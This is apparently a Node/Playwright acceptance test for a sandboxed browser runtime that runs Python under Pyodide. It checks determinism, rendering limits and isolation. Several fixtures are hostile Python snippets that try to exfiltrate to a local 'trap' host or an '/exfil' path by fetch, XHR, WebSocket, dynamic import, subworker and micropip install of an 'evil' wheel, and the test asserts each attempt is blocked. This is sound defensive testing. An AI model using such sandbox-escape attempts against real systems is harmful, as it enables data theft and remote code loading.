// Real production blob Worker + Pyodide. No Worker/HTTP/Python route fixtures.
import assert from 'node:assert/strict';
import {createServer} from 'node:http';
import {readFile,writeFile,mkdir} from 'node:fs/promises';
import {resolve,dirname} from 'node:path';
import {fileURLToPath} from 'node:url';
import {chromium} from 'playwright';
import {makeFixture,emptyTracePython} from './fixtures.mjs';
import {canonicalPreviewJson, previewSha256} from '../contract.ts';
const root = resolve(dirname(fileURLToPath(import.meta.url)),'../../..');
const out = resolve(process.env.OUTPUT_DIR ?? resolve(root,'.local/browser-preview/acceptance'));
const profiles = JSON.parse(await readFile(new URL('./assets/profiles.json',import.meta.url)));
const fixtures = new Map();
fixtures.set('queue',await makeFixture(profiles[0])); fixtures.set('mesa',await makeFixture(profiles[1],'mesa'));
const logs = {app:[],execution:[],trap:[],browser:[],console:[]};
const listen = async handler => {const server=createServer(handler);await new Promise(resolve=>server.listen(0,'0.0.0.0',resolve));return server;};
const send = (res,body,type='text/javascript',headers={}) => {res.writeHead(200,{'Content-Type':type,'Cache-Control':'no-store',...headers});res.end(body);};
const execution = await listen(async(req,res)=>{
  logs.execution.push({url:req.url,cookie:req.headers.cookie??null});
  try {
    const match=/^\/runtime\/([a-f0-9]{64})\/frame.html$/.exec(req.url);
    if(match && profiles.some(p=>p.assetManifest.some(a=>a.path==='delivery/frame.bundle.mjs' && a.sha256===match[1]))) {
      const csp=`default-src 'none'; script-src 'sha256-${Buffer.from(match[1],'hex').toString('base64')}' 'unsafe-eval' 'wasm-unsafe-eval'; connect-src 'none'; worker-src blob:; frame-ancestors *; base-uri 'none'; form-action 'none'`;
      return send(res,await readFile(resolve(root,'.local/browser-preview/execution-assets',req.url.slice(1))),'text/html',{'Content-Security-Policy':csp,'Permissions-Policy':'camera=(), microphone=(), geolocation=(), usb=(), storage-access=()'});
    }
    res.writeHead(404);res.end('denied');
  }catch(error){res.writeHead(500);res.end(String(error));}
});
const trap = await listen((req,res)=>{logs.trap.push({url:req.url,cookie:req.headers.cookie??null});res.writeHead(200,{'Access-Control-Allow-Origin':'*'});res.end('trap');});
const executionOrigin = `http://127.0.0.1:${execution.address().port}`, trapOrigin = `http://127.0.0.1:${trap.address().port}`;
const app = await listen(async(req,res)=>{
  logs.app.push({url:req.url});
  try {
    if(req.url==='/') return send(res,`<!doctype html><html><head><meta charset="utf-8"><title>Browser runtime acceptance</title><style>#visual{max-width:600px}.preview-cell{height:20px;text-align:center}.preview-lane{padding:10px}button{padding:12px}</style></head><body><h1>Local preview acceptance</h1><div id="visual"></div><div id="metrics"></div><button id="play">Play</button><button id="pause">Pause</button><button id="step">Step</button><button id="restart">Restart</button><script type="module" src="/acceptance-host.mjs"></script></body></html>`,'text/html',{'Set-Cookie':'app_session=sentinel; Path=/; SameSite=Lax'});
    if(req.url==='/host.bundle.mjs') return send(res,await readFile(resolve(root,'.local/browser-preview/host.bundle.mjs')));
    if(req.url==='/renderer.mjs') return send(res,await readFile(new URL('./renderer.mjs',import.meta.url)));
    if(req.url==='/protocol.mjs') return send(res,await readFile(new URL('./protocol.mjs',import.meta.url)));
    if(req.url==='/acceptance-host.mjs') return send(res,`import {BrowserPreviewRuntime} from '/host.bundle.mjs';import {PreviewPlayer} from '/renderer.mjs';window.diagnostics=[];window.player=new PreviewPlayer(document.querySelector('#visual'),document.querySelector('#metrics'));const runtimeOptions={executionOrigin:${JSON.stringify(executionOrigin)},assetLoader:async profile=>Promise.all(profile.assetManifest.map(async a=>({path:a.path,bytes:new Uint8Array(await(await fetch('/fixed/'+a.path)).arrayBuffer())}))),onStarted:r=>{window.started=r},onDiagnostic:d=>window.diagnostics.push(d)};window.makeRuntime=()=>new BrowserPreviewRuntime(runtimeOptions);window.runtime=makeRuntime();window.loadFixture=async name=>runtime.load(new Uint8Array(await(await fetch('/package/'+name)).arrayBuffer()));window.runFixture=async input=>{window.started=null;const trace=await runtime.run(input);window.trace=trace;player.load(trace,runtime.loaded.visualization);return trace};for(const action of ['play','pause','step','restart'])document.querySelector('#'+action).onclick=()=>player[action]();window.acceptanceReady=true;`);
    if(req.url.startsWith('/package/')){const value=fixtures.get(req.url.slice(9));if(!value)throw Error('missing fixture');return send(res,canonicalPreviewJson(value),'application/json');}
    if(req.url.startsWith('/fixed/')){const path=req.url.slice(7);const allowed=profiles.some(p=>p.assetManifest.some(a=>a.path===path));if(!allowed)throw Error('asset denied');const file=path.startsWith('assets/')?resolve(root,'.local/browser-preview',path):path.startsWith('delivery/')?resolve(root,'.local/browser-preview',path.slice(9)):path.startsWith('source/')?resolve(root,({'contract.ts':'services/browser-preview/contract.ts','model-spec.ts':'services/simulation/model-spec.ts','package-lock.json':'package-lock.json','prepare-assets.mjs':'services/browser-preview/runtime/prepare-assets.mjs'})[path.slice(7)]):resolve(root,'services/browser-preview/runtime',path.slice(8));return send(res,await readFile(file),'application/octet-stream');}
    res.writeHead(404);res.end('denied');
  }catch(error){res.writeHead(500);res.end(String(error));}
});
const appOrigin = `http://localhost:${app.address().port}`;
await mkdir(out,{recursive:true});
let browser; const evidence={profiles:profiles.map(p=>p.runtime),cases:[]};
try {
  browser=await chromium.launch({headless:true,executablePath:process.env.CHROMIUM_PATH??'/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',args:['--no-proxy-server']});
  const page=await browser.newPage({viewport:{width:1000,height:850}});
  page.on('request',r=>logs.browser.push({url:r.url(),method:r.method()}));page.on('console',m=>logs.console.push({type:m.type(),text:m.text()}));page.on('pageerror',e=>logs.console.push({type:'pageerror',text:String(e)}));
  await page.goto(appOrigin);await page.waitForFunction(()=>window.acceptanceReady);
  const load=async name=>page.evaluate(name=>loadFixture(name),name);
  const run=async input=>page.evaluate(input=>runFixture(input),input);
  await load('queue'); const queue=await run({parameters:{},seed:7});assert.equal(queue.model,'python-queue-trace');assert.deepEqual(await run({parameters:{},seed:7}),queue);assert.notDeepEqual(await run({parameters:{},seed:8}),queue);
  await page.click('#step');assert.equal(await page.locator('#visual').getAttribute('data-frame'),'1');await page.click('#play');await page.waitForTimeout(450);await page.click('#pause');const index=await page.locator('#visual').getAttribute('data-frame');await page.waitForTimeout(250);assert.equal(await page.locator('#visual').getAttribute('data-frame'),index);await page.click('#restart');assert.equal(await page.locator('#visual').getAttribute('data-frame'),'0');
  const queue0=await run({parameters:{},seed:0}),queueMax=await run({parameters:{},seed:4294967295});assert.notDeepEqual(queue0,queueMax);
  await page.screenshot({path:resolve(out,'queue.png')});evidence.cases.push({name:'queue-real-playback-replay-seed-boundaries',passed:true});
  await load('mesa');const mesa=await run({parameters:{steps:12},seed:7});assert.equal(mesa.model,'mesa-schelling');assert.equal(await page.locator('canvas.preview-grid').count(),1);assert.deepEqual(await run({parameters:{steps:12},seed:7}),mesa);assert.notDeepEqual(await run({parameters:{steps:12,homophily:0.8},seed:8}),mesa);const mesaZero=await run({parameters:{steps:4},seed:0}),mesaMax=await run({parameters:{steps:4},seed:4294967295});assert.notDeepEqual(mesaZero,mesaMax);await page.screenshot({path:resolve(out,'mesa.png')});evidence.cases.push({name:'mesa-real-grid-ordinary-steps',passed:true});
  const rendererLimit=await page.evaluate(()=>{const start=performance.now();player.load({model:'legal-extreme-grid',snapshots:[{schemaVersion:'riffology.visual/v0.1',frame:0,time:0,space:{type:'grid',width:1000000,height:1},agents:Array.from({length:10000},(_,i)=>({id:String(i),type:'resident',state:'group-a',x:i,y:0})),metrics:{population:10000}}]},{renderer:'grid',metricKeys:['population']});return {ms:performance.now()-start,nodes:document.querySelector('#visual').childElementCount,width:document.querySelector('canvas').width,height:document.querySelector('canvas').height}});assert.equal(rendererLimit.nodes,1);assert.equal(rendererLimit.width,600);assert.equal(rendererLimit.height,420);assert(rendererLimit.ms<1000);evidence.cases.push({name:'legal-million-cell-grid-fixed-canvas',passed:true,...rendererLimit});
  for(const [name,input] of [['seed-overflow',{parameters:{},seed:4294967296}],['unknown-param',{parameters:{evil:1},seed:7}],['out-of-range',{parameters:{homophily:2},seed:7}],['top-steps',{parameters:{},seed:7,steps:12}]]){await assert.rejects(run(input));evidence.cases.push({name,passed:true});}
  const poisoned=structuredClone(fixtures.get('queue'));poisoned.files[0].base64=Buffer.from('tampered').toString('base64');fixtures.set('tampered',poisoned);await assert.rejects(load('tampered'),/mismatch/);assert.equal(await page.evaluate(()=>runtime.loaded.manifest.packageIdentity),fixtures.get('mesa').manifest.packageIdentity);evidence.cases.push({name:'tampered-source-keeps-valid-package',passed:true});
  // Malicious generated Python is actually executed, including import js.
  const calls=[['fetch',`import js\njs.fetch('${trapOrigin}/fetch').catch(lambda error: None)`],['app-api',`import js\njs.fetch('${appOrigin}/api/private').catch(lambda error: None)`],['xhr',`import js\nx=js.XMLHttpRequest.new()\nx.open('GET','${trapOrigin}/xhr')\ntry: x.send()\nexcept Exception: pass`],['websocket',`import js\ntry: js.WebSocket.new('${trapOrigin.replace('http','ws')}/ws')\nexcept Exception: pass`],['eventsource',`import js\ntry: js.EventSource.new('${trapOrigin}/events')\nexcept Exception: pass`],['dynamic-import-trap',`import js\njs.eval("import('${trapOrigin}/module.mjs').catch(()=>{})")`],['dynamic-import-same-origin',`import js\njs.eval("import('${executionOrigin}/exfil?q=source').catch(()=>{})")`],['subworker',`import js\ntry: js.Worker.new('${executionOrigin}/exfil-worker.mjs')\nexcept Exception: pass`],['forged-connected',`import js\njs.postMessage(js.JSON.parse('{"type":"connected"}'))`],['forged-window-message',`import js\njs.postMessage(js.JSON.parse('{"type":"verify","metrics":{"forged":999}}'))`]];
  for(const [name,code]of calls){const body=code.split('\n').map(l=>'    '+l).join('\n');fixtures.set(name,await makeFixture(profiles[0],'queue',`def run(config):\n${body}\n    ${emptyTracePython}\n`));await load(name);await run({parameters:{},seed:1});evidence.cases.push({name:'malicious-'+name,passed:true});}
  fixtures.set('micropip',await makeFixture(profiles[1],'queue',`async def run(config):\n    import micropip, js\n    attempted=False\n    try: await micropip.install('${trapOrigin}/evil-1.0-py3-none-any.whl')\n    except Exception as error:\n        attempted=True\n        js.console.log('micropip-install-awaited-denied',str(error))\n    if not attempted: raise ValueError('micropip-not-denied')\n    ${emptyTracePython}\n`));await load('micropip');await run({parameters:{},seed:1});assert(logs.console.some(m=>m.text.includes('micropip-install-awaited-denied')));evidence.cases.push({name:'malicious-micropip-real-installed-awaited-denial',passed:true});
  fixtures.set('infinite',await makeFixture(profiles[0],'queue',`def run(config):\n    while True: pass\n`));await load('infinite');await page.evaluate(()=>{window.pendingOutcome=runFixture({parameters:{},seed:1}).then(()=>({ok:true}),e=>({error:e.message}))});await page.waitForFunction(()=>window.started);const isolatedFrame=page.frames().find(f=>f.url().startsWith(executionOrigin));const frameBoundary=await isolatedFrame.evaluate(()=>{let parentDenied=false,cookieDenied=false,cookie='';try{parent.document.body}catch{parentDenied=true}try{cookie=document.cookie}catch{cookieDenied=true}return {parentDenied,cookieDenied,cookie,origin:self.origin}});assert.equal(frameBoundary.parentDenied,true);assert.equal(frameBoundary.cookie,'');assert.equal(frameBoundary.origin,'null');evidence.cases.push({name:'opaque-frame-parent-dom-and-app-cookie-denied',passed:true,...frameBoundary});await page.evaluate(()=>runtime.cancel());assert.equal((await page.evaluate(()=>pendingOutcome)).error,'runtime-cancelled');await load('queue');assert.deepEqual(await run({parameters:{},seed:7}),queue);evidence.cases.push({name:'cancel-infinite-next-valid-run',passed:true});
  await load('infinite');await page.evaluate(()=>{runtime.timeoutMs=8000;window.pendingOutcome=runFixture({parameters:{},seed:1}).then(()=>({ok:true}),e=>({error:e.message}))});assert.equal((await page.evaluate(()=>pendingOutcome)).error,'runtime-timeout');await load('queue');await page.evaluate(()=>runtime.timeoutMs=30000);assert.deepEqual(await run({parameters:{},seed:7}),queue);evidence.cases.push({name:'timeout-infinite-next-valid-run',passed:true});
  fixtures.set('oversized',await makeFixture(profiles[0],'queue',`def run(config):\n    return {'model':'x'*9000000,'snapshots':[]}\n`));await load('oversized');await assert.rejects(run({parameters:{},seed:1}),/output-limit/);evidence.cases.push({name:'python-output-limit-before-postMessage',passed:true});
  fixtures.set('storage-probe',await makeFixture(profiles[0],'queue',`import json, js
async def run(config):
    raw = await js.eval("""(async()=>{
      const blocked=async action=>{try{await action();return false}catch{return true}};
      const indexed=await blocked(()=>new Promise((resolve,reject)=>{const request=indexedDB.open('riffology-isolation');request.onerror=()=>reject(request.error);request.onsuccess=()=>{request.result.close();resolve()}}));
      const cache=await blocked(()=>caches.open('riffology-isolation'));
      const opfs=await blocked(()=>navigator.storage.getDirectory());
      let broadcast=false;try{const channel=new BroadcastChannel('riffology-isolation');channel.close()}catch{broadcast=true}
      return JSON.stringify({indexed,cache,opfs,broadcast,origin:self.origin});
    })()""")
    probe = json.loads(str(raw))
    if probe != {'indexed': True, 'cache': True, 'opfs': True, 'broadcast': False, 'origin': 'null'}:
        raise ValueError('runtime-storage-isolation-failed:'+json.dumps(probe,sort_keys=True))
    ${emptyTracePython}
`));await load('storage-probe');await run({parameters:{},seed:1});await load('storage-probe');await run({parameters:{},seed:2});evidence.cases.push({name:'opaque-worker-persistent-storage-apis-denied-across-runs',passed:true});
  fixtures.set('broadcast-probe',await makeFixture(profiles[0],'queue',`import json, js
async def run(config):
    raw = await js.eval("""new Promise(resolve=>{
      let received=false,channel;
      try{channel=new BroadcastChannel('riffology-isolation')}catch{resolve(JSON.stringify({constructed:false,received:false,origin:self.origin}));return}
      channel.onmessage=()=>{received=true};
      const timer=setInterval(()=>channel.postMessage('sentinel'),25);
      setTimeout(()=>{clearInterval(timer);channel.close();resolve(JSON.stringify({constructed:true,received,origin:self.origin}))},1200);
    })""")
    probe = json.loads(str(raw))
    if probe != {'constructed': True, 'received': False, 'origin': 'null'}:
        raise ValueError('runtime-broadcast-isolation-failed:'+json.dumps(probe,sort_keys=True))
    ${emptyTracePython}
`));await page.evaluate(async()=>{const bytes=new Uint8Array(await(await fetch('/package/broadcast-probe')).arrayBuffer()),left=makeRuntime(),right=makeRuntime();try{await Promise.all([left.load(bytes),right.load(bytes)]);await Promise.all([left.run({parameters:{},seed:1}),right.run({parameters:{},seed:2})]);}finally{left.dispose();right.dispose();}});evidence.cases.push({name:'opaque-worker-broadcastchannel-separated-concurrent-runs',passed:true});
  await load('infinite');await page.evaluate(()=>{window.pendingOutcome=runFixture({parameters:{},seed:1}).then(()=>({ok:true}),e=>({error:e.message}))});await page.waitForFunction(()=>window.started);await page.evaluate(async()=>{const original=runtime.assetLoader,cached=[...runtime.assets].map(([path,bytes])=>({path,bytes}));let release;runtime.assetLoader=()=>new Promise(resolve=>{release=()=>resolve(cached)});const slow=loadFixture('queue').then(()=>({ok:true}),e=>({error:e.message}));await new Promise(resolve=>setTimeout(resolve,50));runtime.assetLoader=original;await loadFixture('mesa');release();window.raceResult=await slow;});assert.equal((await page.evaluate(()=>pendingOutcome)).error,'runtime-cancelled');assert.equal(await page.evaluate(()=>raceResult.error),'runtime-load-superseded');assert.equal(await page.evaluate(()=>runtime.loaded.manifest.packageIdentity),fixtures.get('mesa').manifest.packageIdentity);evidence.cases.push({name:'late-asset-loader-cannot-overwrite-new-package',passed:true});
  // Pending input/package ids do not admit late result messages.
  await page.evaluate(()=>window.postMessage({schema:'riffology.browser-runtime/v1',type:'result',requestId:'local-1',packageIdentity:'a'.repeat(64),trace:{}},'*'));await page.waitForTimeout(200);assert.equal(await page.evaluate(()=>runtime.pending),null);evidence.cases.push({name:'external-postMessage-cannot-submit-or-render',passed:true});
  evidence.cspDiagnostics=await page.evaluate(()=>window.diagnostics);for(const directive of ['connect-src','script-src-elem'])assert(evidence.cspDiagnostics.some(d=>d.directive===directive),directive+' violation must be observed');assert(evidence.cspDiagnostics.some(d=>d.directive==='script-src-elem' && d.blockedURI.startsWith(executionOrigin+'/exfil')), 'same origin import denied by CSP');
  assert.deepEqual(logs.trap,[]);assert.equal(logs.execution.filter(r=>!/^\/runtime\/[a-f0-9]{64}\/frame.html$/.test(r.url)).length,0);assert.equal(logs.execution.some(r=>r.cookie),false);assert.equal(logs.app.some(r=>r.url.startsWith('/api/')),false);
  evidence.cases.push({name:'server-traps-zero-api-zero-execution-cookies',passed:true});
  await writeFile(resolve(out,'queue.json'),JSON.stringify(queue));await writeFile(resolve(out,'mesa.json'),JSON.stringify(mesa));evidence.passed=true;
}catch(error){evidence.passed=false;evidence.error=String(error?.stack??error);throw error;}finally{
  await writeFile(resolve(out,'acceptance.json'),JSON.stringify(evidence,null,2));await writeFile(resolve(out,'logs.json'),JSON.stringify(logs,null,2));
  const names=['acceptance.json','logs.json','queue.json','mesa.json','queue.png','mesa.png'];let sums='';for(const name of names){try{sums+=await previewSha256(await readFile(resolve(out,name)))+'  '+name+'\n';}catch{}}await writeFile(resolve(out,'SHA256SUMS'),sums);
  await browser?.close();for(const server of[app,execution,trap])await new Promise(resolve=>server.close(resolve));
}
console.log(`real browser runtime acceptance passed: ${out}`);
